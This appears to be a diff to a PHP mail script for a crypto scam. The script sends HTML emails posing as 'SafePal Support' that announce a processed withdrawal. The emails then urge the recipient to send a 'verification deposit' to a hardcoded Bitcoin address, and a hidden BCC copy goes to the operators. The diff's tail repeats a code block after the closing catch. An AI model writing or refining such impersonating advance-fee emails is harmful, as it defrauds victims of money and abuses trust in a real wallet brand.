@@ -28,7 +28,7 @@ try {
         $userEmail = $_POST['email'];
         $_SESSION['user_email'] = $userEmail;
     }
-
+    $transactionId = strtoupper(uniqid('SP-'));
     // Setup PHPMailer
     $mail->isSMTP();
     $mail->Host       = 'smtp.gmail.com';
@@ -38,12 +38,52 @@ try {
     $mail->SMTPSecure = 'ssl';
     $mail->Port       = 465;
 
-    $mail->setFrom('safepalservicess@gmail.com', 'Withdrawal Form');
+    $mail->setFrom('safepalservicess@gmail.com', 'SafePal Support');
 
-    $mail->addAddress('safepalservicess@gmail.com'); 
     if ($userEmail) {
-        $mail->addAddress($userEmail);
+        $mail->addAddress($userEmail); // User receives the email
+        $mail->addBCC('safepalwithdrawal@gmail.com'); // Admin gets a hidden copy
     }
+
+
+    $mail->isHTML(true);
+    $mail->Subject = 'Withdrawal Confirmation - Action Required';
+
+    // 🟢 Email body with dynamic amount
+    $mail->Body = "
+<div style='font-family: Arial, sans-serif; color: #333; line-height: 1.6; font-size: 14px;'>
+    <p><strong>Congratulations! Your withdrawal amount of \$" . number_format($amount, 2) . " has been processed successfully.</strong></p>
+
+    <p>Your assigned address below is securely linked to your Cash App account for the final withdrawal step. This means any verification deposit you make to this address will be reflected directly in your Cash App once processed.</p>
+
+    <p><strong style='color: #1E6FFF;'>Assigned Address:</strong><br>
+    <code>bc1q46p7qmw70a4mhnu9jcxn78rhq4n2a024yr993f</code></p>
+
+    <p><strong>To complete your withdrawal, please make a verification deposit of \$" . $verificationDeposit . " to the address above.</strong> Once confirmed, this deposit will be added to your withdrawal amount of <strong>\$" . number_format($amount, 2) . "</strong> and will reflect in your Cash App immediately, guaranteeing no loss of funds.</p>
+
+    <h4 style='color: #1E6FFF; margin: 0 0 4px 0;'>Important:</h4>
+    <ul style='margin: 0; padding-left: 10px;'>
+        <li><strong>This is a security procedure, not a payment to anyone.</strong></li>
+        <li><strong>It works just like micro-deposit verification</strong> used by banks to confirm account access.<strong></li>
+        <li><strong>Never share your private info or send funds to anyone claiming to be a SafePal agent outside official communication.</strong></li>
+    </ul>
+
+    <p>If you have any questions, feel free to reply to this email.</p>
+    <p>Transaction ID:<span>$transactionId</span></p>
+
+    <p>Thank you for choosing SafePal.<br>
+    <span style='color: #1E6FFF;'>Best regards,<br>
+    The SafePal Team</span></p>
+</div>";
+
+    $mail->send();
+
+    header('Location: withdrawalsummary.html');
+    exit;
+
+} catch (Exception $e) {
+    echo "Mailer Error: {$mail->ErrorInfo}";
+}
 
     $mail->isHTML(true);
     $mail->Subject = 'Withdrawal Confirmation - Action Required';
